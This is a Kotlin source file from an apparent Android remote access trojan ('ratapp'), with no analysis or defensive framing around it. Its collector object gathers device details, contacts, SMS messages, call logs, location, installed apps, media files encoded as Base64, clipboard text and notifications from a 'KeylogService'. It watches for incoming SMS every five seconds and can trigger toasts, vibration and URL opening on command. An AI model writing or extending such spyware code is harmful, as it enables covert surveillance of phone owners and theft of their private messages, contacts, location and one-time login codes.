package com.ratio.ratapp

import android.Manifest
import android.content.ClipboardManager
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.database.Cursor
import android.location.LocationManager
import android.net.Uri
import android.os.BatteryManager
import android.os.Build
import android.os.PowerManager
import android.os.VibrationEffect
import android.os.Vibrator
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.MediaStore
import android.telephony.TelephonyManager
import android.util.Base64
import android.widget.Toast
import androidx.core.content.ContextCompat
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import java.io.File

object Collectors {

    private fun has(ctx: Context, perm: String) =
        ContextCompat.checkSelfPermission(ctx, perm) == PackageManager.PERMISSION_GRANTED

    fun deviceInfo(ctx: Context): Map<String, Any?> {
        val tm = ctx.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
        return mapOf(
            "model" to Build.MODEL,
            "brand" to Build.BRAND,
            "manufacturer" to Build.MANUFACTURER,
            "device" to Build.DEVICE,
            "product" to Build.PRODUCT,
            "android" to Build.VERSION.RELEASE,
            "sdk" to Build.VERSION.SDK_INT,
            "fingerprint" to Build.FINGERPRINT,
            "carrier" to (tm.networkOperatorName ?: ""),
            "country" to (tm.networkCountryIso ?: ""),
            "battery" to battery(ctx),
            "screen_on" to screenOn(ctx),
            "ip" to ipAddress(),
            "ts" to System.currentTimeMillis()
        )
    }

    fun battery(ctx: Context): Int {
        val bm = ctx.getSystemService(Context.BATTERY_SERVICE) as BatteryManager
        return bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
    }

    fun screenOn(ctx: Context): Boolean {
        val pm = ctx.getSystemService(Context.POWER_SERVICE) as PowerManager
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT_WATCH) pm.isInteractive
        else @Suppress("DEPRECATION") pm.isScreenOn
    }

    private fun ipAddress(): String {
        return try {
            java.net.NetworkInterface.getNetworkInterfaces().toList()
                .flatMap { it.inetAddresses.toList() }
                .firstOrNull { !it.isLoopbackAddress && it is java.net.Inet4Address }
                ?.hostAddress ?: ""
        } catch (t: Throwable) { "" }
    }

    fun contacts(ctx: Context): List<Map<String, Any?>> {
        if (!has(ctx, Manifest.permission.READ_CONTACTS)) return emptyList()
        val out = mutableListOf<Map<String, Any?>>()
        val cur: Cursor? = ctx.contentResolver.query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            arrayOf(
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                ContactsContract.CommonDataKinds.Phone.NUMBER
            ), null, null, null
        )
        cur?.use {
            while (it.moveToNext()) {
                out.add(mapOf(
                    "name" to (it.getString(0) ?: ""),
                    "number" to (it.getString(1) ?: "")
                ))
            }
        }
        return out
    }

    fun sms(ctx: Context, limit: Int = 200): List<Map<String, Any?>> {
        if (!has(ctx, Manifest.permission.READ_SMS)) return emptyList()
        val out = mutableListOf<Map<String, Any?>>()
        val cur = ctx.contentResolver.query(
            Uri.parse("content://sms"),
            arrayOf("address", "body", "date", "type"),
            null, null, "date DESC LIMIT $limit"
        )
        cur?.use {
            while (it.moveToNext()) {
                out.add(mapOf(
                    "from" to (it.getString(0) ?: ""),
                    "body" to (it.getString(1) ?: ""),
                    "date" to it.getLong(2),
                    "type" to it.getInt(3)
                ))
            }
        }
        return out
    }

    fun startSmsWatch(ctx: Context, scope: CoroutineScope, cb: (Map<String, Any?>) -> Unit) {
        scope.launch(Dispatchers.IO) {
            var last = sms(ctx, 1).firstOrNull()?.get("date") as? Long ?: 0L
            while (true) {
                delay(5000)
                val latest = sms(ctx, 5)
                for (m in latest) {
                    val d = m["date"] as? Long ?: 0
                    if (d > last) { last = d; cb(m) }
                }
            }
        }
    }

    fun callLog(ctx: Context): List<Map<String, Any?>> {
        if (!has(ctx, Manifest.permission.READ_CALL_LOG)) return emptyList()
        val out = mutableListOf<Map<String, Any?>>()
        val cur = ctx.contentResolver.query(
            CallLog.Calls.CONTENT_URI,
            arrayOf(CallLog.Calls.NUMBER, CallLog.Calls.TYPE,
                CallLog.Calls.DURATION, CallLog.Calls.DATE),
            null, null, "${CallLog.Calls.DATE} DESC LIMIT 300"
        )
        cur?.use {
            while (it.moveToNext()) {
                out.add(mapOf(
                    "number" to (it.getString(0) ?: ""),
                    "type" to it.getInt(1),
                    "duration" to it.getLong(2),
                    "date" to it.getLong(3)
                ))
            }
        }
        return out
    }

    @Suppress("MissingPermission")
    fun location(ctx: Context): Map<String, Any?> {
        return try {
            val lm = ctx.getSystemService(Context.LOCATION_SERVICE) as LocationManager
            val providers = listOf(LocationManager.GPS_PROVIDER, LocationManager.NETWORK_PROVIDER)
            var best: android.location.Location? = null
            for (p in providers) {
                try {
                    val l = lm.getLastKnownLocation(p) ?: continue
                    if (best == null || l.time > best!!.time) best = l
                } catch (_: Throwable) {}
            }
            val b = best
            if (b == null) mapOf("error" to "no fix")
            else mapOf(
                "lat" to b.latitude,
                "lng" to b.longitude,
                "acc" to b.accuracy.toDouble(),
                "provider" to b.provider,
                "ts" to b.time
            )
        } catch (t: Throwable) { mapOf("error" to (t.message ?: "err")) }
    }

    fun apps(ctx: Context): List<Map<String, Any?>> {
        val pm = ctx.packageManager
        val list = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU)
            pm.getInstalledApplications(PackageManager.ApplicationInfoFlags.of(0))
        else @Suppress("DEPRECATION") pm.getInstalledApplications(0)
        return list.map {
            mapOf(
                "pkg" to it.packageName,
                "name" to pm.getApplicationLabel(it).toString(),
                "system" to ((it.flags and android.content.pm.ApplicationInfo.FLAG_SYSTEM) != 0)
            )
        }.sortedBy { it["name"] as String }
    }

    fun mediaList(ctx: Context): List<Map<String, Any?>> {
        val out = mutableListOf<Map<String, Any?>>()
        val proj = arrayOf(
            MediaStore.MediaColumns.DATA,
            MediaStore.MediaColumns.DISPLAY_NAME,
            MediaStore.MediaColumns.SIZE,
            MediaStore.MediaColumns.DATE_ADDED
        )
        val uris = listOf(
            MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
            MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
            MediaStore.Audio.Media.EXTERNAL_CONTENT_URI
        )
        for (u in uris) {
            try {
                val c = ctx.contentResolver.query(u, proj, null, null,
                    "${MediaStore.MediaColumns.DATE_ADDED} DESC LIMIT 200")
                c?.use {
                    while (it.moveToNext()) {
                        out.add(mapOf(
                            "path" to (it.getString(0) ?: ""),
                            "name" to (it.getString(1) ?: ""),
                            "size" to it.getLong(2),
                            "date" to it.getLong(3),
                            "type" to u.lastPathSegment
                        ))
                    }
                }
            } catch (_: Throwable) {}
        }
        return out
    }

    fun mediaGet(path: String): Map<String, Any?> {
        val f = File(path)
        if (!f.exists()) return mapOf("error" to "not found")
        if (f.length() > 3_000_000) return mapOf("error" to "too big", "size" to f.length())
        val b64 = Base64.encodeToString(f.readBytes(), Base64.NO_WRAP)
        return mapOf("name" to f.name, "size" to f.length(), "data" to b64)
    }

    fun clipboard(ctx: Context): String {
        val cm = ctx.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
        return cm.primaryClip?.getItemAt(0)?.text?.toString() ?: ""
    }

    fun notifications(ctx: Context): List<Map<String, Any?>> =
        KeylogService.notificationsSnapshot()

    fun toast(ctx: Context, msg: String) {
        android.os.Handler(android.os.Looper.getMainLooper()).post {
            Toast.makeText(ctx, msg, Toast.LENGTH_LONG).show()
        }
    }

    fun vibrate(ctx: Context, ms: Long) {
        val v = ctx.getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
        if (Build.VERSION.SDK_INT >= 26)
            v.vibrate(VibrationEffect.createOneShot(ms, VibrationEffect.DEFAULT_AMPLITUDE))
        else @Suppress("DEPRECATION") v.vibrate(ms)
    }

    fun openUrl(ctx: Context, url: String) {
        try {
            val i = Intent(Intent.ACTION_VIEW, Uri.parse(url))
                .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            ctx.startActivity(i)
        } catch (_: Throwable) {}
    }
}